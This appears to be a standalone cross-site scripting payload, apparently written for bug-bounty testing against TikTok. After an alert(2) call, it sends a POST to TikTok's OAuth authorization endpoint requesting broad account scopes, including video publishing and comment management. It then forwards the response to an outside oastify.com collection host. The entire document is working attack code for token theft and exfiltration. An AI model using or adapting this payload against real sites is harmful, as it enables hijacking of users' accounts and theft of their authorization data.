alert(2),
fetch("https://tiktok.com/passport/open/web/auth/?client_key=7236493407642714114&scope=comment.list,video.publish,user.account.type,user.info.username,user.insights,user.info.basic,video.list,video.insights,comment.list.manage,user.info.stats&aid=1459&source=web&redirect_uri=https://tiktok.com/", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
  },
  body: JSON.stringify({
  }),
})
  .then(response => response.json())
  .then(data => {
    // Send the response to another domain
    fetch("https://ibxsj0xlhl3n7m3fbtptipbyapgo4es3.oastify.com/receive", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    });
  })
  .catch(error => console.error('Error:', error));
